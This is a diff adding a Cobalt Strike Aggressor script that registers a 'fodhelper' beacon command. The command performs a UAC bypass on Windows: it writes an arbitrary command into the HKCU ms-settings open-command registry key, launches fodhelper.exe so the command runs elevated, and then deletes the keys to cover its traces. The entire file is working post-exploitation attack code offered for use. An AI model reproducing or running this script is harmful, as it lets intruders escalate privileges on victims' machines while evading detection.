@@ -1,0 +1,33 @@
+# Created by 0xf55
+
+alias fodhelper {
+    local('$cmd');
+
+    $cmd = $2;
+
+    println("Running fodhelper UAC bypass...");
+
+    bshell($1,
+        'reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d "' .
+        $cmd .
+        '" /f'
+    );
+
+    bshell($1,
+        'reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v "DelegateExecute" /f'
+    );
+    bshell($1,'fodhelper.exe');
+    println("[+] Finished... Cleaning up");
+
+    sleep(3500);
+
+    bshell($1,'reg delete HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /f');
+    bshell($1,'reg delete HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v "DelegateExecute" /f');
+
+}
+
+beacon_command_register(
+    "fodhelper",
+    "UAC bypass via fodhelper.exe",
+    "Usage: fodhelper <command>"
+);
